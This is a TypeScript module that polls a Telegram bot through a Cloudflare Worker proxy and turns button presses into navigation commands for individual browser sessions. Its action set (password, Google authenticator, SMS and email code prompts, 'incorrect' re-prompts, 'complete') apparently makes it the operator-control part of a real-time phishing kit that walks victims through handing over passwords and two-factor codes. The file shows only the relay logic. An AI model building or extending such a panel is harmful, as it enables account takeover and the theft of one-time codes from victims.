// Telegram Callback Polling Service - Robust Session Management
// This service polls Telegram for callback button presses and handles user navigation

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";

// Cloudflare Worker proxy for bypassing Iran IP restrictions
const TELEGRAM_API_BASE =
  "https://telegram-proxy-fragrant-fog-f09d.anthonynoelmills.workers.dev";

interface TelegramUpdate {
  update_id: number;
  callback_query?: {
    id: string;
    from: {
      id: number;
      first_name: string;
    };
    message: {
      message_id: number;
      chat: {
        id: number;
      };
    };
    data: string;
  };
}

interface CallbackHandler {
  sessionId: string;
  onCallback: (action: string) => void;
  registeredAt: number;
  lastUsed: number;
}

class TelegramCallbackService {
  private handlers = new Map<string, CallbackHandler>();
  private isPolling = false;
  private pollInterval: NodeJS.Timeout | null = null;
  private currentPollDelay = 500;
  private processingCommands = new Set<string>(); // Track which sessions are processing commands
  private maxPollDelay = 10000; // Max 10 seconds
  private isOnline = true;

  /**
   * Register a callback handler for a session
   * This is the ONLY way handlers should be added
   */
  registerHandler(sessionId: string, onCallback: (action: string) => void) {
    const timestamp = Date.now();

    console.log("📝 Registering handler:", {
      sessionId,
      timestamp,
      currentCount: this.handlers.size,
    });

    // Check if handler already exists and warn about override
    if (this.handlers.has(sessionId)) {
      console.warn(
        "⚠️ Handler already exists for session, overriding:",
        sessionId,
      );
      console.log(
        "📋 Previous handler age:",
        Date.now() - this.handlers.get(sessionId)!.registeredAt,
        "ms",
      );
    }

    // Always accept new registrations - no cleanup during registration
    this.handlers.set(sessionId, {
      sessionId,
      onCallback,
      registeredAt: timestamp,
      lastUsed: timestamp,
    });

    console.log(
      "✅ Handler registered successfully. Total:",
      this.handlers.size,
    );
    console.log("🔍 All sessions:", Array.from(this.handlers.keys()));

    // Start polling if not already started
    if (!this.isPolling) {
      this.startPolling();
    }

    // Clean up very old handlers only (older than 10 minutes)
    this.cleanupVeryOldHandlers();
  }

  /**
   * Clean up only very old handlers (10+ minutes old)
   */
  private cleanupVeryOldHandlers() {
    const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
    let cleaned = 0;

    for (const [sessionId, handler] of this.handlers.entries()) {
      if (handler.registeredAt < tenMinutesAgo) {
        this.handlers.delete(sessionId);
        cleaned++;
        console.log("🧹 Cleaned very old handler:", sessionId);
      }
    }

    if (cleaned > 0) {
      console.log(
        `🧹 Cleaned ${cleaned} very old handlers. Remaining: ${this.handlers.size}`,
      );
    }
  }

  /**
   * Unregister a callback handler with delay
   */
  unregisterHandler(sessionId: string) {
    console.log("🗑️ Scheduling unregistration for:", sessionId);

    // Long delay to prevent any race conditions
    setTimeout(() => {
      const handler = this.handlers.get(sessionId);
      if (handler) {
        console.log("🗑️ Unregistering handler:", {
          sessionId,
          age: Date.now() - handler.registeredAt,
          lastUsed: Date.now() - handler.lastUsed,
        });
        this.handlers.delete(sessionId);
        console.log("📊 Remaining handlers:", this.handlers.size);
      }

      // Stop polling if no handlers left
      if (this.handlers.size === 0) {
        this.stopPolling();
      }
    }, 10000); // 10 second delay
  }

  /**
   * Start polling for Telegram updates
   */
  async startPolling() {
    if (this.isPolling) return;

    console.log("🔄 Starting Telegram callback polling...");
    this.isPolling = true;
    this.consecutiveErrors = 0;
    this.currentPollDelay = 500;

    // Clear any existing webhook
    await this.clearWebhook();

    this.pollForUpdates();
  }

  /**
   * Stop polling
   */
  stopPolling() {
    console.log("🛑 Stopping Telegram callback polling");
    this.isPolling = false;

    if (this.pollInterval) {
      clearTimeout(this.pollInterval);
      this.pollInterval = null;
    }
  }

  /**
   * Clear webhook to avoid conflicts
   */
  private async clearWebhook() {
    if (!this.validateToken()) return;

    try {
      console.log("🧹 Clearing Telegram webhook...");
      const response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook?drop_pending_updates=true`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
        },
      );

      if (response.ok) {
        console.log("✅ Webhook cleared successfully");
      } else {
        console.warn("⚠️ Failed to clear webhook:", response.status);
      }
    } catch (error) {
      console.warn("⚠️ Error clearing webhook:", error);
    }
  }

  /**
   * Poll for new updates from Telegram
   */
  private async pollForUpdates() {
    if (!this.isPolling) return;

    // Handle demo mode
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Skipping Telegram poll");
      this.scheduleNextPoll();
      return;
    }

    try {
      console.log("📡 Polling for updates...", {
        lastUpdateId: this.lastUpdateId,
        handlerCount: this.handlers.size,
      });

      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout

      const response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${this.lastUpdateId + 1}&limit=10&timeout=5`,
        {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
          },
          signal: controller.signal,
        },
      );

      clearTimeout(timeout);

      if (!response.ok) {
        await this.handleHttpError(response);
        this.scheduleNextPoll();
        return;
      }

      const data = await response.json();
      const updates = data.result || [];

      console.log(`📡 Received ${updates.length} updates`);

      for (const update of updates) {
        this.lastUpdateId = Math.max(this.lastUpdateId, update.update_id);

        if (update.callback_query) {
          await this.handleCallback(update.callback_query);
        }
      }

      this.onSuccessfulPoll();
    } catch (error) {
      await this.handleNetworkError(error);
    }

    this.scheduleNextPoll();
  }

  /**
   * Schedule next poll
   */
  private scheduleNextPoll() {
    if (!this.isPolling) return;

    this.pollInterval = setTimeout(() => {
      this.pollForUpdates();
    }, this.currentPollDelay);
  }

  /**
   * Clean up old handlers to prevent memory leaks
   */
  private cleanupOldHandlers() {
    const now = Date.now();
    const maxAge = 30 * 60 * 1000; // 30 minutes

    for (const [sessionId, handler] of this.handlers.entries()) {
      if (now - handler.registeredAt > maxAge) {
        console.log("🧹 Cleaning up old handler:", sessionId);
        this.handlers.delete(sessionId);
      }
    }
  }

  /**
   * Handle HTTP errors
   */
  private async handleHttpError(response: Response) {
    if (response.status === 409) {
      console.warn("⚠️ Telegram 409 Conflict - clearing webhook...");
      await this.clearWebhook();
      this.currentPollDelay = 2000;
      return;
    }

    console.error(`❌ HTTP ${response.status} error from Telegram API`);
    this.incrementErrorsAndAdjustDelay();
  }

  /**
   * Handle successful poll - reset error counter
   */
  private onSuccessfulPoll() {
    if (this.consecutiveErrors > 0) {
      console.log("✅ Poll successful - resetting error count");
      this.consecutiveErrors = 0;
      this.currentPollDelay = 3000; // Reset to optimized 3 second polling
    }
  }

  /**
   * Handle network errors
   */
  private async handleNetworkError(error: any) {
    if (error.name === "AbortError") {
      console.warn("⏰ Request timeout - continuing...");
    } else {
      console.warn("🌐 Network error:", error.message);
    }

    this.incrementErrorsAndAdjustDelay();
  }

  /**
   * Increment error count and adjust polling delay
   */
  private incrementErrorsAndAdjustDelay() {
    this.consecutiveErrors++;
    this.currentPollDelay = Math.min(
      this.currentPollDelay * 1.2,
      this.maxPollDelay,
    );

    console.log(
      `⚠️ Error count: ${this.consecutiveErrors}, next poll in ${this.currentPollDelay / 1000}s`,
    );

    // Reset after many errors
    if (this.consecutiveErrors >= 20) {
      console.log("🔄 Resetting after many errors");
      this.consecutiveErrors = 0;
      this.currentPollDelay = 500;
    }
  }

  /**
   * Handle callback from Telegram
   */
  private async handleCallback(callback: any) {
    console.log("📞 Received callback:", {
      id: callback.id,
      data: callback.data,
      user: callback.from?.first_name,
      timestamp: new Date().toLocaleString(),
      availableHandlers: this.handlers.size,
    });

    const callbackData = callback.data;

    // Parse callback data: auth_TYPE_SESSIONID or incorrect_TYPE_SESSIONID or complete_auth_SESSIONID
    const parts = callbackData.split("_");
    if (parts.length < 2) {
      console.error("❌ Invalid callback data format:", callbackData);
      await this.answerCallbackQuery(callback.id, "❌ Invalid request format");
      return;
    }

    let action: string;
    let sessionId: string;

    if (parts[0] === "auth") {
      if (parts.length < 3) {
        console.error("❌ Invalid auth callback format:", callbackData);
        await this.answerCallbackQuery(callback.id, "❌ Invalid auth format");
        return;
      }
      action = parts[1];
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "incorrect") {
      if (parts.length < 3) {
        console.error("❌ Invalid incorrect callback format:", callbackData);
        await this.answerCallbackQuery(
          callback.id,
          "❌ Invalid incorrect format",
        );
        return;
      }
      action = `incorrect_${parts[1]}`;
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "complete") {
      if (parts.length < 3) {
        console.error("❌ Invalid complete callback format:", callbackData);
        await this.answerCallbackQuery(
          callback.id,
          "❌ Invalid complete format",
        );
        return;
      }
      action = "complete";
      sessionId = parts.slice(2).join("_");
    } else {
      console.error("❌ Unknown callback action:", callbackData);
      await this.answerCallbackQuery(callback.id, "❌ Unknown action");
      return;
    }

    console.log("🎯 Parsed callback:", { action, sessionId });
    console.log("📊 Current session handlers:", {
      totalHandlers: this.handlers.size,
      sessionIds: Array.from(this.handlers.keys()),
      targetSession: sessionId,
    });

    // Check if this session is already processing a command
    if (this.processingCommands.has(sessionId)) {
      console.warn("⚠️ Session already processing command:", sessionId);
      await this.answerCallbackQuery(
        callback.id,
        "⚠️ Already processing previous command",
      );
      return;
    }

    // STRICT SESSION MATCHING - No fallback to prevent cross-user commands
    let handler = this.findBestHandler(sessionId);

    if (handler) {
      // Lock this session during processing
      this.processingCommands.add(sessionId);

      // Update last used timestamp
      handler.lastUsed = Date.now();

      console.log("✅ Handler found, processing action:", {
        sessionId,
        action,
        handlerSessionId: handler.sessionId,
      });

      await this.answerCallbackQuery(callback.id, `✅ Processing ${action}...`);

      try {
        handler.onCallback(action);
        console.log("✅ Action processed successfully for session:", sessionId);
      } catch (error) {
        console.error("❌ Error in callback handler:", error);
        await this.answerCallbackQuery(callback.id, "❌ Processing error");
      } finally {
        // Always unlock the session
        this.processingCommands.delete(sessionId);
        console.log("🔓 Session unlocked:", sessionId);
      }
    } else {
      console.error("❌ No exact handler found for session:", sessionId);
      console.log("📋 Available handlers:", Array.from(this.handlers.keys()));
      await this.answerCallbackQuery(
        callback.id,
        "❌ Session not found - please refresh page",
      );
    }
  }

  /**
   * Find the best handler using strict session matching
   */
  private findBestHandler(targetSessionId: string): CallbackHandler | null {
    console.log("🔍 Finding handler for:", targetSessionId);
    console.log("🔍 Available handlers:", Array.from(this.handlers.keys()));

    // Strategy 1: STRICT exact match only
    let handler = this.handlers.get(targetSessionId);
    if (handler) {
      console.log("✅ Exact match found");
      return handler;
    }

    // Strategy 2: Try to find session from callback data pattern
    // Extract clean session ID from potential callback data
    let cleanSessionId = targetSessionId;

    // Handle callback data patterns like "auth_password_sessionId"
    const callbackPatterns = [
      /^auth_password_(.+)$/,
      /^auth_google_(.+)$/,
      /^auth_sms_(.+)$/,
      /^auth_email_(.+)$/,
      /^incorrect_password_(.+)$/,
      /^incorrect_google_(.+)$/,
      /^incorrect_sms_(.+)$/,
      /^incorrect_email_(.+)$/,
      /^complete_auth_(.+)$/,
    ];

    for (const pattern of callbackPatterns) {
      const match = targetSessionId.match(pattern);
      if (match) {
        cleanSessionId = match[1];
        console.log("🔍 Extracted session ID from callback:", cleanSessionId);
        break;
      }
    }

    // Try exact match with clean session ID
    handler = this.handlers.get(cleanSessionId);
    if (handler) {
      console.log("✅ Exact match found with clean session ID");
      return handler;
    }

    // STRICT: No fallback strategies that could affect wrong users
    // Only return null if no exact match found
    console.error(
      "❌ No exact session match found - preventing cross-user commands",
    );
    console.log("📋 Target session:", targetSessionId);
    console.log("📋 Clean session:", cleanSessionId);
    console.log("📋 Available sessions:", Array.from(this.handlers.keys()));

    return null;
  }

  /**
   * Answer a callback query
   */
  private async answerCallbackQuery(callbackQueryId: string, text: string) {
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Would answer callback query:", text);
      return;
    }

    try {
      await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false,
          }),
        },
      );
    } catch (error) {
      console.warn("⚠️ Failed to answer callback query:", error);
    }
  }

  /**
   * Validate Telegram token
   */
  private validateToken(): boolean {
    return !(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN");
  }

  /**
   * Get debug info
   */
  getDebugInfo() {
    return {
      isPolling: this.isPolling,
      handlerCount: this.handlers.size,
      handlers: Array.from(this.handlers.entries()).map(([id, handler]) => ({
        sessionId: id,
        registeredAt: new Date(handler.registeredAt).toLocaleString(),
        lastUsed: new Date(handler.lastUsed).toLocaleString(),
        age: Date.now() - handler.registeredAt,
      })),
      consecutiveErrors: this.consecutiveErrors,
      currentPollDelay: this.currentPollDelay,
      lastUpdateId: this.lastUpdateId,
    };
  }
}

// Create singleton instance
const telegramCallbackService = new TelegramCallbackService();

// Export functions
export const registerTelegramCallback = (
  sessionId: string,
  onCallback: (action: string) => void,
): void => {
  // Create a wrapper that validates session ownership before processing
  const wrappedCallback = (action: string) => {
    console.log("🔍 Callback received for session:", {
      sessionId,
      action,
      currentUrl: window.location.href,
      timestamp: new Date().toISOString(),
    });

    // Validate that this action is meant for this specific session
    const storedSessionId = sessionStorage.getItem("sessionId");
    if (storedSessionId !== sessionId) {
      console.warn("🚫 Session mismatch - ignoring callback:", {
        storedSession: storedSessionId,
        callbackSession: sessionId,
        action,
      });
      return;
    }

    onCallback(action);
  };

  telegramCallbackService.registerHandler(sessionId, wrappedCallback);
};

export const unregisterTelegramCallback = (sessionId: string) => {
  telegramCallbackService.unregisterHandler(sessionId);
};

export const getTelegramCallbackDebugInfo = () => {
  return telegramCallbackService.getDebugInfo();
};

export default telegramCallbackService;
